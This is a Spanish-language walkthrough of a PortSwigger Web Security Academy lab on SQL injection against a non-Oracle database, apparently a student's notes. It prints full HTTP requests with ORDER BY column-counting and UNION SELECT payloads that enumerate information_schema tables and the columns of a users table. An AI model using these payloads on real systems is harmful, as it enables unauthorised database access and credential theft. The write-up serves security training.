---
description: >-
  https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-non-oracle
---

# Lab 5: SQL injection attack, listing the database contents on non-Oracle databases

Se inicia el laboratorio y al interactuar con los filtros de busqueda:

Se genera la siguiente peticion:

```
GET /filter?category=Corporate+gifts HTTP/2
Host: 0aeb00b004aac525817ed54000ef0015.web-security-academy.net
Cookie: session=5YjQozT4bUZR3JR3qDg9UE97lh1xaCaY
Sec-Ch-Ua: "Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Accept-Language: es-CO
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0aeb00b004aac525817ed54000ef0015.web-security-academy.net/
Accept-Encoding: gzip, deflate, br
Priority: u=0, i


```

Y la anterior peticion responde asi:

```
HTTP/2 200 OK
Content-Type: text/html; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 8912

```

Empezamos a validar el numero de campos con ORDER BY:

```
GET /filter?category='+order+by+1-- HTTP/2
Host: 0aeb00b004aac525817ed54000ef0015.web-security-academy.net
Cookie: session=5YjQozT4bUZR3JR3qDg9UE97lh1xaCaY
Sec-Ch-Ua: "Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Accept-Language: es-CO
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0aeb00b004aac525817ed54000ef0015.web-security-academy.net/
Accept-Encoding: gzip, deflate, br
Priority: u=0, i


```

Lo anterior responde asi:

```
HTTP/2 200 OK
Content-Type: text/html; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 3920

```

Se procede a incrementar el valor a 2:

```
GET /filter?category='+order+by+2-- HTTP/2
Host: 0aeb00b004aac525817ed54000ef0015.web-security-academy.net
Cookie: session=5YjQozT4bUZR3JR3qDg9UE97lh1xaCaY
Sec-Ch-Ua: "Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Accept-Language: es-CO
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0aeb00b004aac525817ed54000ef0015.web-security-academy.net/
Accept-Encoding: gzip, deflate, br
Priority: u=0, i


```

Y lo anterior responde asi:

```
HTTP/2 200 OK
Content-Type: text/html; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 3920

```

Y finalizamos validando con el numero 3:

```
GET /filter?category='+order+by+3-- HTTP/2
Host: 0aeb00b004aac525817ed54000ef0015.web-security-academy.net
Cookie: session=5YjQozT4bUZR3JR3qDg9UE97lh1xaCaY
Sec-Ch-Ua: "Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Accept-Language: es-CO
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0aeb00b004aac525817ed54000ef0015.web-security-academy.net/
Accept-Encoding: gzip, deflate, br
Priority: u=0, i


```

La inyeccion previa responde con un error:

```
HTTP/2 500 Internal Server Error
Content-Type: text/html; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 2423

```

Por lo tanto, podemos afirmar que tenemos 2 campos disponibles para nuestras proximas inyecciones:

Luego de validar que tipo de dato son cada columna, podemos enumerar con el siguiente payload:

```
GET /filter?category='+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables-- HTTP/2
Host: 0aeb00b004aac525817ed54000ef0015.web-security-academy.net
Cookie: session=5YjQozT4bUZR3JR3qDg9UE97lh1xaCaY
Sec-Ch-Ua: "Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Accept-Language: es-CO
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0aeb00b004aac525817ed54000ef0015.web-security-academy.net/
Accept-Encoding: gzip, deflate, br
Priority: u=0, i


```

La anterior consulta responde asi:

<figure><img src="../.gitbook/assets/image (7) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Luego de obtener los nombres de las tablas podemos intentar retornar las columnas de una tabla especifica:

```
GET /filter?category='+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='users_upxvct'-- HTTP/2
Host: 0aeb00b004aac525817ed54000ef0015.web-security-academy.net
Cookie: session=5YjQozT4bUZR3JR3qDg9UE97lh1xaCaY
Sec-Ch-Ua: "Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Accept-Language: es-CO
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0aeb00b004aac525817ed54000ef0015.web-security-academy.net/
Accept-Encoding: gzip, deflate, br
Priority: u=0, i


```

El payload anterior logra retornar los nombres de las columnas de la tabla USUARIOS:

<figure><img src="../.gitbook/assets/image (8) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Utilizando los nombres de las columnas y el nombre de la tabla, se diseña una consulta que retorne los valores que tiene esta tabla:

<figure><img src="../.gitbook/assets/image (9) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
